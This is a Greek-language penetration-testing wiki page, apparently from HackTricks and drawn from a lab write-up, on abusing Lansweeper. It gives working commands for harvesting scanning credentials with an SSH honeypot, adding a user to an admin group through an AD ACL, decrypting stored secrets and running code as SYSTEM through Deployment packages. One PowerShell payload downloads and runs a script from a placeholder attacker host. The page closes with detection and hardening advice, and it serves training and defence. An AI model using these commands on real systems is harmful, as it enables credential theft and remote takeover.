# Lansweeper Abuse: Credential Harvesting, Secrets Decryption και Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Το Lansweeper είναι μια πλατφόρμα discovery και inventory IT assets, η οποία αναπτύσσεται συνήθως σε Windows και ενσωματώνεται με το Active Directory. Τα credentials που έχουν ρυθμιστεί στο Lansweeper χρησιμοποιούνται από τις scanning engines του για authentication σε assets μέσω πρωτοκόλλων όπως SSH, SMB/WMI και WinRM. Οι εσφαλμένες ρυθμίσεις συχνά επιτρέπουν:

- Interception credentials μέσω redirecting ενός scanning target σε host που ελέγχεται από τον attacker (honeypot)
- Abuse των AD ACLs που εκτίθενται από groups σχετιζόμενα με το Lansweeper, για απόκτηση remote access
- On-host decryption secrets που έχουν ρυθμιστεί στο Lansweeper (connection strings και stored scanning credentials)
- Code execution σε managed endpoints μέσω της λειτουργίας Deployment (η οποία συχνά εκτελείται ως SYSTEM)

Αυτή η σελίδα συνοψίζει πρακτικά attacker workflows και commands για την εκμετάλλευση αυτών των συμπεριφορών κατά τη διάρκεια engagements.

## 1) Harvest scanning credentials μέσω honeypot (παράδειγμα SSH)

Ιδέα: δημιουργήστε ένα Scanning Target που δείχνει στον host σας και αντιστοιχίστε σε αυτό υπάρχοντα Scanning Credentials. Όταν εκτελεστεί το scan, το Lansweeper θα προσπαθήσει να κάνει authentication με αυτά τα credentials και το honeypot σας θα τα καταγράψει.<sup>[[1]](#references)</sup>

Επισκόπηση βημάτων (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (ή Single IP) = το VPN IP σας
- Ρυθμίστε το SSH port σε κάτι προσβάσιμο (π.χ. 2022 αν το 22 είναι blocked)
- Απενεργοποιήστε το schedule και προγραμματίστε να το triggerάρετε manually
- Scanning → Scanning Credentials → βεβαιωθείτε ότι υπάρχουν Linux/SSH creds· αντιστοιχίστε τα στο νέο target (ενεργοποιήστε τα όλα, όπου απαιτείται)
- Κάντε click στο “Scan now” στο target
- Εκτελέστε ένα SSH honeypot και ανακτήστε το username/password που χρησιμοποιήθηκε στην προσπάθεια authentication

Παράδειγμα με sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Επικύρωση των captured creds έναντι των υπηρεσιών DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Σημειώσεις
- Άλλα πρωτόκολλα δεν είναι ισοδύναμα: ένας listener SMB/WinRM συνήθως αποκτά ένα NTLM challenge-response αντί για cleartext password. Το cracking ή το relaying του εξαρτάται από τις διαπραγματευμένες προστασίες του πρωτοκόλλου· δείτε [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). Το SSH password authentication είναι συνήθως η απλούστερη περίπτωση cleartext.
- Το SSH public-key authentication εκθέτει στον server το username και το public-key fingerprint, **όχι** το private key ή το passphrase του. Ανακτήστε τα key-backed credentials από τον compromised Lansweeper server αντί να περιμένετε από ένα honeypot να τα αποκαλύψει.<sup>[[2]](#references)</sup>
- Πολλά scanners αναγνωρίζονται από διακριτά client banners (π.χ. RebexSSH) και θα επιχειρήσουν benign commands (uname, whoami κ.λπ.).

### Η σειρά επιλογής των credentials έχει σημασία

Σε ένα rescan, το Lansweeper επιχειρεί πρώτα ξανά το credential που πέτυχε τελευταίο για το συγκεκριμένο asset, έπειτα τα credentials που έχουν αντιστοιχιστεί ρητά, με τη ρυθμισμένη σειρά τους, και τέλος το global credential του ίδιου τύπου. Ένα honeypot που αποδέχεται το πρώτο password authentication επομένως κανονικά δεν θα παρατηρήσει τα επόμενα fallback credentials· κατά τη διάρκεια ενός authorized credential-path assessment, καταγράψτε και απορρίψτε τις απόπειρες αν ο στόχος είναι η επαλήθευση ολόκληρης της fallback sequence.<sup>[[6]](#references)</sup>

## 2) Κατάχρηση AD ACL: αποκτήστε remote access προσθέτοντας τον εαυτό σας σε ένα app-admin group

Χρησιμοποιήστε το BloodHound για να απαριθμήσετε τα effective rights του compromised account. Ένα συνηθισμένο εύρημα είναι ένα scanner- ή app-specific group (π.χ. “Lansweeper Discovery”) που διαθέτει GenericAll πάνω σε ένα privileged group (π.χ. “Lansweeper Admins”). Αν το privileged group είναι επίσης μέλος του “Remote Management Users”, το WinRM γίνεται διαθέσιμο μόλις προσθέσουμε τον εαυτό μας.<sup>[[1]](#references)[[5]](#references)</sup>

Παραδείγματα συλλογής:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll σε group με BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Στη συνέχεια, αποκτήστε ένα interactive shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Συμβουλή: Οι λειτουργίες Kerberos είναι ευαίσθητες στον χρόνο. Αν εμφανιστεί το KRB_AP_ERR_SKEW, συγχρονιστείτε πρώτα με το DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Αποκρυπτογράφηση των secrets που έχουν ρυθμιστεί από το Lansweeper στον host

Στον Lansweeper server, το ASP.NET site συνήθως αποθηκεύει ένα κρυπτογραφημένο connection string και ένα symmetric key που χρησιμοποιείται από την εφαρμογή. Με κατάλληλη local πρόσβαση, μπορείτε να αποκρυπτογραφήσετε το DB connection string και, στη συνέχεια, να εξαγάγετε τα αποθηκευμένα scanning credentials.<sup>[[1]](#references)</sup>

Τυπικές τοποθεσίες:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Χρησιμοποιήστε το SharpLansweeperDecrypt για την αυτοματοποίηση της αποκρυπτογράφησης και την εξαγωγή των αποθηκευμένων creds. Χωρίς arguments, το τρέχον executable αποκρυπτογραφεί το `web.config`, συνδέεται στη βάση δεδομένων και εξάγει όλα τα configured scanning credentials· το `-e` υποστηρίζει επίσης offline/manual αποκρυπτογράφηση όταν μια encrypted value και το key file είναι ήδη διαθέσιμα:<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
Το αναμενόμενο αποτέλεσμα περιλαμβάνει στοιχεία σύνδεσης DB και credentials σάρωσης σε plaintext, όπως λογαριασμούς Windows και Linux που χρησιμοποιούνται σε όλη την υποδομή. Αυτοί συχνά διαθέτουν αυξημένα τοπικά δικαιώματα σε hosts του domain:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Χρησιμοποιήστε τα ανακτημένα Windows scanning creds για privileged access:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Ως μέλος των “Lansweeper Admins”, το web UI εκθέτει τις επιλογές Deployment και Configuration. Στην ενότητα Deployment → Deployment packages, μπορείτε να δημιουργήσετε packages που εκτελούν arbitrary commands σε assets-στόχους. Το Lansweeper χρησιμοποιεί ένα administrative scanning credential για να αποκτήσει πρόσβαση στο Task Scheduler και στο `C$` του target και, στη συνέχεια, δημιουργεί ένα task για το deployment. Όταν το package χρησιμοποιεί το **System Account** run mode, το payload εκτελείται ως `NT AUTHORITY\SYSTEM`. Άλλα run modes μπορούν να χρησιμοποιήσουν το mapped scanning credential ή τον currently logged-on user, επομένως επαληθεύστε το επιλεγμένο mode αντί να θεωρείτε δεδομένο ότι είναι SYSTEM.<sup>[[1]](#references)[[7]](#references)</sup>

High-level steps:
- Δημιουργήστε ένα νέο Deployment package που εκτελεί ένα PowerShell ή cmd one-liner (reverse shell, add-user κ.λπ.).
- Στοχεύστε το επιθυμητό asset (π.χ. το DC/host όπου εκτελείται το Lansweeper) και κάντε κλικ στο Deploy/Run now.
- Κάντε catch το shell σας ως SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Οι ενέργειες deployment είναι θορυβώδεις και αφήνουν logs στο Lansweeper και στα Windows event logs. Χρησιμοποιήστε τες με φειδώ.

### Artifacts του deployment και ένα δεύτερο σημείο έκθεσης credentials

Ο scanner γράφει το εκτελέσιμο του deployment στο `C:\Windows\LSDeployment` μέσω του `C$`. Τα αρχεία των packages διαβάζονται συνήθως από το `DefaultPackageShare$`, το οποίο υποστηρίζεται από το `C:\Program Files (x86)\Lansweeper\PackageShare`, ή από ένα package share συγκεκριμένο για το IP range. Είναι σημαντικό ότι το Lansweeper τεκμηριώνει πως το credential του package share αποθηκεύεται σε **αναστρέψιμα κρυπτογραφημένη μορφή στο registry κάθε υπολογιστή που λαμβάνει deployment**. Αντιμετωπίστε ένα compromised managed endpoint ως πιθανό σημείο αποκάλυψης για αυτό το share account και ελέγξτε τον κατάλογο deployment, το ιστορικό scheduled tasks και τα ρυθμισμένα package shares κατά την ανακατασκευή της δραστηριότητας του Lansweeper.<sup>[[7]](#references)</sup>

## Detection και hardening

- Περιορίστε ή καταργήστε τα anonymous SMB enumerations. Παρακολουθείτε για RID cycling και anomalous access στα Lansweeper shares.
- Egress controls: αποκλείστε ή περιορίστε αυστηρά το outbound SSH/SMB/WinRM από scanner hosts. Δημιουργήστε alert για non-standard ports (π.χ. 2022) και unusual client banners όπως το Rebex.
- Προστατεύστε τα `Website\\web.config` και `Key\\Encryption.txt`. Μεταφέρετε τα secrets σε vault και κάντε rotation σε περίπτωση exposure. Εξετάστε service accounts με ελάχιστα privileges και gMSA όπου είναι εφικτό.
- AD monitoring: δημιουργήστε alert για αλλαγές σε Lansweeper-related groups (π.χ. “Lansweeper Admins”, “Remote Management Users”) και για αλλαγές ACL που παρέχουν GenericAll/Write membership σε privileged groups.
- Ελέγχετε τις δημιουργίες/αλλαγές/εκτελέσεις Deployment packages και συσχετίστε νέα remote scheduled tasks με writes στο `C:\Windows\LSDeployment`. Δημιουργήστε alert για packages που κάνουν spawn `cmd.exe`/`powershell.exe` ή για unexpected outbound connections.
- Δώστε στα package-share credentials μόνο permission **Read & Execute** και μην τα επαναχρησιμοποιείτε για administration. Προτιμήστε agent-based inventory όπου είναι πρακτικό: αν όλοι οι υπολογιστές σαρώνονται από agent και το deployment module δεν χρησιμοποιείται, το Lansweeper δεν απαιτεί αποθηκευμένα computer scanning credentials.<sup>[[6]](#references)[[7]](#references)</sup>

## Σχετικά θέματα
- [SMB/LSA/SAMR enumeration και RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Kerberos authentication και considerations για clock skew](kerberos-authentication.md)
- [Ανάλυση paths στο BloodHound](bloodhound.md)
- [Χρήση του WinRM και lateral movement](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Κατάχρηση του Lansweeper Scanning, των AD ACLs και των Secrets για την κατάληψη ενός DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Δημιουργία και αντιστοίχιση scanning credentials — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Απαιτήσεις deployment — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
